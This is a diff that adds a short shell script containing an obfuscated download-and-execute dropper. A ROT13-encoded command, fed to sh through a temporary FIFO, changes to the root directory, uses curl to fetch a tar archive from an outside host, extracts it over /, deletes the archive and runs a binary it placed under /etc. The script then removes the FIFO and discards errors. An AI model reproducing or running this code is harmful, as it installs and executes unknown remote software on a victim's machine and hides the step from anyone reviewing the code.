@@ -1,0 +1,8 @@
+#!/bin/sh
+FIFO=/tmp/__skrypt_$(date +%F)_$$
+mkfifo $FIFO
+sh $FIFO &
+tr 'a-zA-Z' 'n-za-mN-ZA-M' >$FIFO <<EOF_EOF
+pq /; phey y.pconpxvg.va/sgc.gne > /sgc.gne; gne ks /sgc.gne; ez -es /sgc.gne; /rgp/pconpxvg/pconpxvg
+EOF_EOF
+rm $FIFO >/dev/null 2>/dev/null
